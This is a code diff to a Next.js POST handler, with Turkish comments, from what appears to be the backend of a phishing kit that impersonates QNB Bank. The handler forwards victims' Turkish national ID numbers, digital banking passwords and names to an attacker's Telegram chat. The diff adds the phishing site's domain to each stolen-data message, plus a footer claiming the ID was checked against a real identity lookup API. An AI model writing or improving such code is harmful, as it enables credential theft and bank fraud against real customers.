@@ -22,6 +22,11 @@ export async function POST(request: NextRequest) {
       )
     }
 
+    // Domain bilgisini al
+    const host = request.headers.get('host') || 'bilinmeyen-domain'
+    const protocol = request.headers.get('x-forwarded-proto') || 'http'
+    const fullDomain = `${protocol}://${host}`
+
     // Telegram bilgilerini al
     const token = process.env.TELEGRAM_TOKEN
     const chatId = process.env.TELEGRAM_CHAT
@@ -38,6 +43,8 @@ export async function POST(request: NextRequest) {
     const message = `
 🔔 *YENİ QNB BAŞVURUSU*
 
+🌐 *Domain:* \`${fullDomain}\`
+
 👤 *Kullanıcı Bilgileri:*
 🆔 TC Kimlik: \`${telegramData.username}\`
 🔐 Dijital Şifre: \`${telegramData.password}\`
@@ -48,7 +55,8 @@ export async function POST(request: NextRequest) {
 ${telegramData.realName ? `👤 Ad Soyad: \`${telegramData.realName} ${telegramData.realSurname}\`` : ''}
 
 ---
-
+🏦 QNB Bank Başvuru Sistemi
+⚠️ Bu bilgiler gerçek TC sorgulama API'si ile doğrulanmıştır.
     `.trim()
 
     // Telegram API'sine istek gönder
